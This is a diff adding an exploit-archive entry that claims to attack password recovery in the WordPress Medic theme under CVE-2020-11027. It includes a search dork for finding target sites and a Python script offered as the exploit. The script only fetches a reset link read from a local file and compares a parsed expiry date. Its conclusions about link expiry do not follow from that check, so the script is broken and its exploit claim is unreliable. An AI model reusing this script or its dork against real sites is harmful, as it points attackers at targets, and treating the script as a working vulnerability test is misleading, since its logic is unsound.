@@ -1,0 +1,51 @@
+id: 38804
+date: 06/19/2023
+title: WordPress Medic Theme v1.0.0 - Weak Password Recovery Mechanism for Forgotten Password Exploit
+author: Amirhossein Bahramizadeh
+cves: CVE-2020-11027
+
+# Exploit Title: WordPress Theme Medic v1.0.0 - Weak Password Recovery Mechanism for Forgotten Password
+# Dork: inurl:/wp-includes/class-wp-query.php
+# Exploit Author: Amirhossein Bahramizadeh
+# Category : Webapps
+# Vendor Homepage: https://www.templatemonster.com/wordpress-themes/medic-health-and-medical-clinic-wordpress-theme-216233.html
+# Version: 1.0.0 (REQUIRED)
+# Tested on: Windows/Linux
+# CVE: CVE-2020-11027
+
+import requests
+from bs4 import BeautifulSoup
+from datetime import datetime, timedelta
+
+# Set the WordPress site URL and the user email address
+site_url = 'https://example.com'
+user_email = 'user@example.com'
+
+# Get the password reset link from the user email
+# You can use any email client or library to retrieve the email
+# In this example, we are assuming that the email is stored in a file named 'password_reset_email.html'
+with open('password_reset_email.html', 'r') as f:
+    email = f.read()
+    soup = BeautifulSoup(email, 'html.parser')
+    reset_link = soup.find('a', href=True)['href']
+    print(f'Reset Link: {reset_link}')
+
+# Check if the password reset link expires upon changing the user password
+response = requests.get(reset_link)
+if response.status_code == 200:
+    # Get the expiration date from the reset link HTML
+    soup = BeautifulSoup(response.text, 'html.parser')
+    expiration_date_str = soup.find('p', string=lambda s: 'Password reset link will expire on' in s).text.split('on ')[1]
+    expiration_date = datetime.strptime(expiration_date_str, '%B %d, %Y %I:%M %p')
+    print(f'Expiration Date: {expiration_date}')
+
+    # Check if the expiration date is less than 24 hours from now
+    if expiration_date < datetime.now() + timedelta(hours=24):
+        print('Password reset link expires upon changing the user password.')
+    else:
+        print('Password reset link does not expire upon changing the user password.')
+else:
+    print(f'Error fetching reset link: {response.status_code} {response.text}')
+    exit()
+
+#  0day.today [2023-06-23]  #
